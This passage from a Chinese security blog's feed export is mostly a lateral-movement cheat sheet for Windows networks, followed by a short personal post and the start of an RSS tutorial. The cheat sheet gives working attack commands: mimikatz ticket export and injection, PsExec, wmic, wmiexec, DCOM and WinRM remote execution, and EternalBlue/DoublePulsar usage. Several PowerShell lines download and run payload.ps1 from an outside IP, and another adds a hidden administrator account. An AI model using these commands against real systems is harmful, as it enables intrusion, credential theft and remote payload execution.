title="PsExec工具远程命令执行横向移动(老了，被杀软盯死了，而且日志太多)"></a>PsExec工具远程命令执行横向移动(老了，被杀软盯死了，而且日志太多)</h3><p>PsExec介绍</p><p>是windows下非常好的一款远程命令行工具。类似于RDP的平替。psexec的使用不需要对方开放3389，只需要对方开启了admin和IPC(默认开启)，比如我电脑上</p><p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-5.png" alt="img"></p><p>还需要开启了445端口。如果防火墙关闭了445端口，则会提示网络路径找不着。由于psexec是windows自带的工具，所以杀软将其放在白名单中</p><p>下载地址<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>PsExec使用条件</p><p>1.具有正确的凭证(内存凭证、账号密码、账号NTLM Hash)</p><p>2.能建立IPC链接(也就是需要通过smb认证)，并且目标机器开启了共享(默认开启)，并且目标中必须要有admin$共享</p><p>PsExec常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">psexec \\ip -u administrator -p admin cmd 进入半交互式shell</span><br><span class="line">psexec -accepteula \\192.168.108.101 -u administrator -p admin -s cmd.exe 建立交互的shell</span><br><span class="line">psexec \\ip -u administrator -p admin -w c:\cmd 进入交互式shell，且c:\是目标机器工作目录</span><br><span class="line">psexec \\ip -u administrator -p admin whoami all 执行命令</span><br><span class="line">psexec \\ip -u administrator -p admin -d c:\beacon.exe 执行命令</span><br><span class="line">psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的用户权限执行文件</span><br></pre></td></tr></table></figure><p>返回交互式的shell或者执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\192.168.41.150 -s cmd.exe 返回交互shell(必须是msf或者远程到桌面CS)</span><br><span class="line">psexec.exe -accepteula \\192.168.41.150 -s ipconfig 远程执行命令</span><br></pre></td></tr></table></figure><p>net use \192.168.41.20\c$ admin@123 &#x2F;user:administor</p><p>建立IPC链接，就能在后续的操作中不再输入账号密码</p><p>删除建立的ipc链接</p><p>Net use * &#x2F;del &#x2F;y</p><p>通过这种方式能传票据获取到访问权限，然后通过copy命令进行传木马，然后再在这里进行执行。</p><p>或者直接用CS里面集成好的就行</p><p>或者说使用票据传递</p><p>导出票据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;</span><br></pre></td></tr></table></figure><p>清除票据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br><span class="line">mimikatz kerberos::purge</span><br></pre></td></tr></table></figure><p> 票据注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [<span class="number">0</span>;<span class="number">998</span>d7]<span class="operator">-</span>x<span class="operator">-</span>x<span class="operator">-</span>xxxxxx<span class="operator">-</span>Administrator<span class="variable">@krbtht</span><span class="operator">-</span>HACK.COMkirbi</span><br></pre></td></tr></table></figure><p>查看是否有票</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br><span class="line">dir \\xx.xxx.xxx\c$</span><br></pre></td></tr></table></figure><p>上传文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">copy</span> C:\xxx\xxx\desktop\xxxx.exe \\dc.xxx.xxx\C$</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe <span class="operator">-</span>accepteula  \\dc.xxx.com <span class="operator">-</span>h <span class="operator">-</span>d C:\xxxx.exe</span><br></pre></td></tr></table></figure><p>如果有账号密码直接IPC链接</p><p>如果有凭证就pth</p><p>如果有票据就ptt</p><h3 id="WMIC远程执行命令横向移动-无日志，极好用"><a href="#WMIC远程执行命令横向移动-无日志，极好用" class="headerlink" title="WMIC远程执行命令横向移动(无日志，极好用)"></a>WMIC远程执行命令横向移动(无日志，极好用)</h3><p>WMI是在powershell没发布前，微软用来管理windows系统的数据库工具。wmi本身是数据库架构，使用dcom或者winrm协议，自从psexec在内网中被严格监控后，更多使用wmiexec进行横向，windows系统默认不会讲wmi操作记录在日志中,又转换成使用wmic</p><p>wmic拓展wmi(windows management instrumentation，windows管理规范)，即wmic.exe,提供了命令行接口和批处理脚本执行系统管理的支持，</p><p>但是啊但是，wmic只有本地管理员或者域管才能正常使用，如果普通权限用户想用wmi，需要修改普通用户的acl，不过修改用户的acl也需要管理员权限，普通用户使用wmic。以下命令均在2008R2、2012R2、2016上进行测试，部分命令在虚拟机中测试不行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">wmic logon list brief 登录用户</span><br><span class="line">wmic ntdomain list brief 域控机器</span><br><span class="line">wmic useraccount list brief 用户列表</span><br><span class="line">wmic share <span class="keyword">get</span> name,path 查看系统共享</span><br><span class="line">wmic service list brief <span class="operator">|</span> more 服务列表</span><br><span class="line">wmic startup list <span class="keyword">full</span> 识别开机启动的程序，包括路径</span><br><span class="line">wmic fsdir &quot;c:\\test&quot; <span class="keyword">call</span> <span class="keyword">delete</span> 删除c盘下的test目录</span><br><span class="line">wmic nteventlog <span class="keyword">get</span> path,filename,writeable 查看系统中开启的日志</span><br><span class="line">wmic qfe <span class="keyword">get</span> description,installedOn 使用wmic识别系统中补丁的情况</span><br><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,InstalledOn 列出系统中所有补丁具体情况</span><br><span class="line">wmic product <span class="keyword">get</span> name,version 查看系统中安装的软件以及版本</span><br><span class="line">wmic useraccount <span class="keyword">where</span> &quot;name=%UserName%&quot; <span class="keyword">call</span> rename newUserName 更改当前用户名</span><br><span class="line">wmic useraccount <span class="keyword">where</span> &quot;name=Administrator&quot; <span class="keyword">call</span> Rename admin 更改指定用户名</span><br><span class="line">wmic bios list <span class="keyword">full</span> <span class="operator">|</span> findstr <span class="operator">/</span>i &quot;vmware&quot; 查看当前系统是否为vmware</span><br><span class="line">wmic desktop <span class="keyword">get</span> screens Acer secure,screensavertimeout 查看当前是否有屏保，延迟多少</span><br><span class="line">wmic process <span class="keyword">where</span> name<span class="operator">=</span>&quot;vmtoolsd.exe&quot; fet executablepath 获取指定进程的可执行文件路径，比如这里vmtools</span><br><span class="line">wmic environment <span class="keyword">where</span> &quot;name=&#x27;temp&#x27;&quot; <span class="keyword">get</span> UserName,VariableValue 获取环境变量</span><br><span class="line">查询本机磁盘</span><br><span class="line">wmic logicaldisk llist brief</span><br><span class="line">wmic logicaldisk <span class="keyword">get</span> description,name,size,freespace <span class="operator">/</span><span class="keyword">value</span></span><br><span class="line">卸载和重装安装程序</span><br><span class="line">wmic product <span class="keyword">where</span> &quot;name like &#x27;%office%&#x27;&quot; <span class="keyword">get</span> name</span><br><span class="line">wmic product <span class="keyword">where</span> name<span class="operator">=</span>&quot;office&quot; <span class="keyword">call</span> uninstall</span><br><span class="line">查看某个进程的详细信息(路径，命令行参数)</span><br><span class="line">wmic process <span class="keyword">where</span> name<span class="operator">=</span>&quot;wps.exe&quot; list <span class="keyword">full</span></span><br><span class="line">wmic process <span class="keyword">where</span> name<span class="operator">=</span>&quot;wps.exe&quot; <span class="keyword">get</span> executablepath,name,ProcessId 进程路径</span><br><span class="line">更改path环境变量值，新增c:\whoami</span><br><span class="line">wmic environment <span class="keyword">where</span> &quot;name=&#x27;path&#x27; and usernmae=&#x27;&lt;system&gt;&#x27;&quot; <span class="keyword">set</span> VariableValue<span class="operator">=</span>&quot;%path%;c:\whoami&quot;</span><br><span class="line">查看某个进程的详细信息<span class="operator">-</span>PID</span><br><span class="line">wmic process llist brief</span><br><span class="line">tasklist <span class="operator">/</span>SVC <span class="operator">|</span> findstr frp.exe</span><br><span class="line">wmic process <span class="keyword">where</span> ProcessId<span class="operator">=</span><span class="number">123</span> list <span class="keyword">full</span></span><br><span class="line">wmic process <span class="keyword">where</span> name <span class="operator">=</span>&quot;xxx.exe&quot; <span class="keyword">call</span> terminate</span><br><span class="line">ntsd <span class="operator">-</span>c q <span class="operator">-</span>p PID</span><br><span class="line">获取电脑产品编号和型号</span><br><span class="line">wmic baseboard <span class="keyword">get</span> Product,Serialnumber</span><br><span class="line">wmic bios <span class="keyword">get</span> serialnumber</span><br><span class="line">安装软件</span><br><span class="line">wmic product <span class="keyword">get</span> name,version</span><br><span class="line">wmic product list brief</span><br></pre></td></tr></table></figure><p>错误代码含义以及解决方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x800706ba</span>  RPC服务器不可用  开启防火墙，允许共享例外</span><br><span class="line"><span class="number">0x80070005</span>  拒绝访问    组策略允许administraotr远程访问</span><br><span class="line"><span class="number">0x800706ba</span>  RPC服务器不可用  IP安全策略阻止<span class="number">135</span></span><br><span class="line"><span class="number">0x80070422</span> 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动   启用winmgmt服务</span><br><span class="line">拒绝wbem(Web<span class="operator">-</span>Based Enterprise Management)目录权限，无法使用wmic</span><br></pre></td></tr></table></figure><p>wmic调用cmd</p><p>需要管理员权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">执行命令并且输出</span><br><span class="line">wmic <span class="operator">/</span>node:IP地址 <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 process <span class="keyword">call</span> <span class="keyword">create</span> &quot;cmd.exe /c ipconfig &gt; C:\ip.txt&quot;</span><br><span class="line">列出远程主机进程</span><br><span class="line">wmic  <span class="operator">/</span>node:IP地址 <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 process list brief</span><br><span class="line">在远程系统上执行bat脚本</span><br><span class="line">wmic <span class="operator">/</span>node:IP地址 <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 process <span class="keyword">call</span> <span class="keyword">create</span> c:\process.bat</span><br><span class="line">wmic <span class="operator">/</span>node:IP地址 <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 process <span class="keyword">call</span> <span class="keyword">create</span> &quot;cmd.exe /c net user test1 !@123we /add &amp;&amp; net localgroup administrators test1 /add&quot;</span><br><span class="line">执行powershell上线</span><br><span class="line">wmic <span class="operator">/</span>node:IP <span class="operator">/</span><span class="keyword">user</span>:本地用户管理员<span class="operator">/</span>域管理员 <span class="operator">/</span>password:密码 PROCESS <span class="keyword">call</span> <span class="keyword">create</span> &quot;powershell.exe -nop -w hidden -c \ &quot;IEX ((<span class="keyword">new</span><span class="operator">-</span>object net.webclient).downloadstring(<span class="string">&#x27;ps脚本地址&#x27;</span>))\&quot;&quot;</span><br></pre></td></tr></table></figure><p>利用powershell上线</p><p>利用cs生成powershell脚本，到服务器，然后用上面最后一句运行即可</p><h3 id="wmiexec工具（会被windows-defender挡）"><a href="#wmiexec工具（会被windows-defender挡）" class="headerlink" title="wmiexec工具（会被windows defender挡）"></a>wmiexec工具（会被windows defender挡）</h3><p> wmiexec是一个由全交互和半交互的远程命令执行工具，由python版本的pe版本可运行多种环境，包括webshell环境，rdp环境、socks环境等。和wmic一样的，优点是不写入磁盘，不留下系统日志，但是啊但是会有很多网络流量传递</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe 域名<span class="operator">/</span>用户名：密码@目标IP #哈希传递获得shell</span><br><span class="line">wmiexec.exe 域名<span class="operator">/</span>用户名：密码@目标IP &quot;ipconfigb&quot; #执行命令</span><br><span class="line">wmiexec.exe <span class="operator">-</span>hashes LM Hash:NT Hash 域名<span class="operator">/</span>用户名@目标IP #哈希传递获得shell(从cs上能看LMhash和NThash)</span><br><span class="line">wmiexec.exe <span class="operator">-</span>hashes LM Hash:NT Hash 域名<span class="operator">/</span>用户名@目标IP ”ipconfig“ #执行命令</span><br></pre></td></tr></table></figure><p>wmiexec.vbs</p><p>脚本调用wmi来模拟PsExec的功能，在远程中执行命令并进行回显，获取远程主机的半交互式的shell，wmiexec.vbs支持半交互shell模式，另一种是执行单条命令模式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe <span class="operator">/</span><span class="operator">/</span>nologo wmiexec.vbs <span class="operator">/</span>cmd IP 用户 密码 &quot;命令&quot;</span><br></pre></td></tr></table></figure><p>Invoke-WMIExec</p><p>是一个powershell脚本在invoke-TheHash的文件中用法如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke<span class="operator">-</span>WMIExec <span class="operator">-</span>Target IP <span class="operator">-</span>Domain 域 <span class="operator">-</span>Username 用户 <span class="operator">-</span>Hash hash<span class="operator">-</span>Command &quot;calc.exe&quot; <span class="operator">-</span>verbose</span><br></pre></td></tr></table></figure><p>采用无文件落地方式进行横向</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell <span class="operator">-</span><span class="keyword">exec</span> bypass <span class="operator">-</span>c IEX (<span class="keyword">New</span><span class="operator">-</span>Object System.Net.Webclient).DownloadString(<span class="string">&#x27;xxxxxx&#x27;</span>);import<span class="operator">-</span><span class="keyword">module</span> .\Invoke<span class="operator">-</span>WMIExec.ps1;Invoke<span class="operator">-</span>WMIExec <span class="operator">-</span>Target xxx.xxx.xxx.xxx <span class="number">0</span>Username administrator <span class="operator">-</span>Hash xxxxxxxxxxxxxxxxxxxxx <span class="operator">-</span>Command &quot;whoami&quot; <span class="operator">-</span>verbose</span><br></pre></td></tr></table></figure><p>本地执行</p><p>导入脚本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="operator">-</span>import powershell<span class="operator">/</span>Invoke<span class="operator">-</span>WMIExec.ps1</span><br></pre></td></tr></table></figure><p>运行上线命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Invoke<span class="operator">-</span>WMIExec <span class="operator">-</span>Target xxx.xxx.xxx.xxx <span class="operator">-</span>Username administrator <span class="operator">-</span>Hash xxxxxxxxxxxxxxxxx <span class="operator">-</span>Command &quot;powershell.exe -nop -w hidden -c IEX ((new-objectnet.webclient).downloadstring(&#x27;xxxxxx&#x27;))&quot; <span class="operator">-</span>verbose</span><br></pre></td></tr></table></figure><p>Invoke-WMIMethod.ps1</p><p>为powershell的内置模块，可以使用自由组合的命令进行测试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">User</span> #目标系统用户名 </span><br><span class="line">$Password #目标系统密码 </span><br><span class="line">$Cred #账号密码整合，导入Credential </span><br><span class="line">Invoke<span class="operator">-</span>WMIMethod #远程运行指定程序 </span><br><span class="line">#####<span class="comment">---------------------------##### </span></span><br><span class="line">$<span class="keyword">User</span> <span class="operator">=</span> &quot;administrator&quot; </span><br><span class="line">$Password<span class="operator">=</span> ConvertTo<span class="operator">-</span>SecureString <span class="operator">-</span>String &quot;Admin@123&quot; <span class="operator">-</span>AsPlainText <span class="operator">-</span>Force </span><br><span class="line">$Cred <span class="operator">=</span> <span class="keyword">New</span><span class="operator">-</span>Object <span class="operator">-</span>TypeName System.Management.Automation.PSCredential <span class="operator">-</span> </span><br><span class="line">ArgumentList $<span class="keyword">User</span> , $Password </span><br><span class="line">Invoke<span class="operator">-</span>WMIMethod <span class="operator">-</span>Class Win32_Process <span class="operator">-</span>Name <span class="keyword">Create</span> <span class="operator">-</span>ArgumentList &quot;powershell.exe </span><br><span class="line">-nop -w hidden -c IEX ((new-object </span><br><span class="line">net.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot; <span class="operator">-</span> </span><br><span class="line">ComputerName &quot;192.168.41.20&quot; <span class="operator">-</span>Credential $Cred</span><br></pre></td></tr></table></figure><h3 id="SMB远程代码执行（不能在cs里面用，得拿到机器才能用）"><a href="#SMB远程代码执行（不能在cs里面用，得拿到机器才能用）" class="headerlink" title="SMB远程代码执行（不能在cs里面用，得拿到机器才能用）"></a>SMB远程代码执行（不能在cs里面用，得拿到机器才能用）</h3><p>smbexec使用</p><p>smbexec是impacket工具中的工具，操作简单，容易被杀，使用无需先进行ipc链接</p><p>由于它在域控制里面经常用到，所以一般来说不会被禁用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec <span class="operator">-</span>hashes :$HASH$ .<span class="operator">/</span>admin<span class="variable">@xxx</span>.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><h3 id="DCOM远程命令横向移动"><a href="#DCOM远程命令横向移动" class="headerlink" title="DCOM远程命令横向移动"></a>DCOM远程命令横向移动</h3><p>DCOM介绍</p><p>DCOM是微软的一系列概念和程序接口，支持不同机器上的组件间相互通信，不论是运行在局域网、广域网、还是internet上，利用这个接口，客户端对象能向网络中另一台积极去上的服务器程序对象发送请求，使用</p><p>域管的administrator账户或者目标主机具有主机的管理员账户</p><p>windows自带</p><p>通过powershell与dcom进行远程交互，另外我们需要提供一个dcom progid和一个ip地址，然后就能远程返回一个com对象的实例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$com<span class="operator">=</span>[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;11.111.111.111&quot;))</span><br></pre></td></tr></table></figure><p>执行命令，能调用executeshellcommand方法在远程主机上启动进程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$com.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,$<span class="keyword">null</span>,&quot;/c shell.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure><p>将ip和命令更换即可</p><p>shellwindows远程命令执行</p><p>这里的值是COM 对象的类标识符，这个值是通过查找和CLSID关联代码并创建类对象获取的</p><p>相关文章:<a href="https://www.exploit-db.com/docs/48767">https://www.exploit-db.com/docs/48767</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Activator]::CreateInstance([Type]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,&quot;127.0.0.1&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:windowssystem32&quot;,$<span class="keyword">null</span>,<span class="number">0</span>) 打开本地计算器</span><br></pre></td></tr></table></figure><p><img src="/./../image/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1729157028307-6.png" alt="img"></p><p>Shellbrowserwindow</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.41.147&quot;)).Document.Application.shellExecute(&quot;cmd.exe&quot;,&quot;/c powershell.exe -nop -w hidden -c IEX ((new-objectnet.webclient).downloadstring(&#x27;http://118.178.134.226:9988/payload.ps1&#x27;))&quot;,&quot;c:windowssystem32&quot;,$<span class="keyword">null</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>Excel.Application</p><p>装有excle</p><p>通过powershell与dcom进行远程交互，创建excel.application对象的实例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$com <span class="operator">=</span> </span><br><span class="line">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.1 </span><br><span class="line">68.41.147&quot;)) </span><br><span class="line">$com.DisplayAlerts <span class="operator">=</span> $<span class="literal">false</span> </span><br><span class="line">$com <span class="operator">=</span> </span><br><span class="line">[activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;127.0 </span><br><span class="line">.0.1&quot;)) </span><br></pre></td></tr></table></figure><p>执行后面的命令，调用执行该对象在”DDElnitiate”方法在远程主机上启动进程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;/c 参数&quot;)</span><br></pre></td></tr></table></figure><p>Visio.Application远程代码执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.52.138&quot;)).[<span class="number">0</span>].Document.Application.shellExecute(&quot;C:shell.exe&quot;) </span><br></pre></td></tr></table></figure><p>Outlook.Application远程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.52.138&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;C:shell.exe&quot;) </span><br></pre></td></tr></table></figure><h3 id="WinRM远程执行命令"><a href="#WinRM远程执行命令" class="headerlink" title="WinRM远程执行命令"></a>WinRM远程执行命令</h3><p>WinRM(windows远程管理)是microsoft在windows中对ws-management的实现，将通用网络访问或交换管理信息。利用脚本或内置的命令行工具，winrm可以与可能具有基板管理控制器(BMC)的任何远程计算机一起使用，以获取数据。也可以获取基于windows的计算机(包括winrm)</p><p>winrm默认端口为5985或5986，若配置了winrm远程，当我们拿到管理员账号，可以用远程连接进行命令执行操作</p><p>配置winrm，可以参考<a href="https://blog.csdn.net/qq_23663693/article/details/121654390">https://blog.csdn.net/qq_23663693/article/details/121654390</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="operator">-</span>r:http:<span class="operator">/</span><span class="operator">/</span>xxx.xxx.xxx.xxx:xxxx <span class="operator">-</span>u administrator <span class="operator">-</span>p:xxxxx &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>如果出现例如客户端无法处理该请求，则输入 winrm set winrm&#x2F;config&#x2F;Client @{TrustedHosts&#x3D;”*”}</p><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>使用cs生成bin文件</p><p>使用msf把bin文件变成dll文件,或者直接生成也行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="operator">-</span>p generic<span class="operator">/</span>custom PAYLOADFILE<span class="operator">=</span>.<span class="operator">/</span>payload.bin <span class="operator">-</span>a x64 <span class="comment">--platform windows -f dll -o wanli111.dll</span></span><br><span class="line">Eternalblue<span class="number">-2.2</span><span class="number">.0</span>.exe <span class="comment">--TargetIp 192.168.41.168 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig outlog.txt</span></span><br><span class="line">Doublepulsar<span class="number">-1.3</span><span class="number">.1</span>.exe <span class="comment">--InConfig Doublepulsar-1.3.1.xml --TargetIp 192.168.41.168 --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload 123.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谢罪篇</title>
      <link href="/posts/e1a9176bc199/"/>
      <url>/posts/e1a9176bc199/</url>
      
        <content type="html"><![CDATA[<h1 id="谢罪了谢罪了"><a href="#谢罪了谢罪了" class="headerlink" title="谢罪了谢罪了"></a>谢罪了谢罪了</h1><p>​很久没更新了。这段时间内由于加入了星盟下属的幼麟安全团队预备队里，而且日常学习任务也比较重，忽略了更新博客。。。</p><p>​学习是没拉下的，甚至来说，这段时间中是我最安心学习的一段时间。团队里面其实氛围很好，然后也能看到各个师傅很优秀了但依旧非常努力。当然我也在学啦。之后就会把一些学习的内容进行梳理然后发布。</p><p>​忽视了这一边，谢罪了，磕头磕头</p><p><img src="/posts/f407262d9961/8408cc9239f9fc.gif"></p><h1 id="抱怨以及感慨"><a href="#抱怨以及感慨" class="headerlink" title="抱怨以及感慨"></a>抱怨以及感慨</h1><p>​这段时间内还在负责南昌大学网络空间安全竞赛基地，各种招新活动还有会议，还有行程要定。开会做报告，规划基地未来发展，对新生进行培养之类的，还有回答问题等一些东西。时间多少会挤占吧，然后还有女朋友，这个就我心甘情愿，哈哈哈。时间不够，真的，时间。</p><p>​其实挺羡慕新生大一的，因为对我来说。我们这一届是没有接受到一个良好的培养的，基本上是由我们自行学习，路线也没给，然后还要成绩，学院的支持只能说很有限。我这一届相当于是学院在这方面的开拓者吧。另外还负责了很多关于学校的建设的内容吧。我们这一届是大类招生，然后学校里面其实是有一个社团性质的搞网安的组织。我大一是呆在那里，但是里面大一一整年其实是没教真东西的，当时是不清楚网安到底应该怎么学，并且相信他们的培养计划，所以也是跟着他们一起没有自己去找信息，现在来看其实挺后悔的，毕竟浪费了一整年，没学到东西，从大二才开始学东西，然后后面的能力都是自己去学习，自己去摸索。要我说是有点吃亏吧，没办法。</p><p>​一年里面能力还是有提升吧，但还是不够，挺吃紧的。加油好好学吧。</p><p>​</p>]]></content>
      
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给博客创建 RSS 订阅源的三种方法</title>
      <link href="/posts/335ca95a5110/"/>
      <url>/posts/335ca95a5110/</url>
      
        <content type="html"><![CDATA[<p>首先是介绍我的 Blog 正在使用的方法，其次是一个较为普遍性的方法，最后是通过 RSSHub 的方法</p><h2 id="1-hexo-generator-feed"><a href="#1-hexo-generator-feed" class="headerlink" title="1.hexo-generator-feed"></a>1.hexo-generator-feed</h2><p>由于我的博客是用 Hexo 建的，所以可以直接使用集成好的模块 hexo-generator-feed ，配置简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed --save </span><br><span class="line">或者使用</span><br><span class="line">bun install hexo-generator-feed </span><br></pre></td></tr></table></figure><p>打开 Hexo 博客的_config.yml</p><p>添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># RSS</span><br><span class="line">feed:</span><br><span class="line">  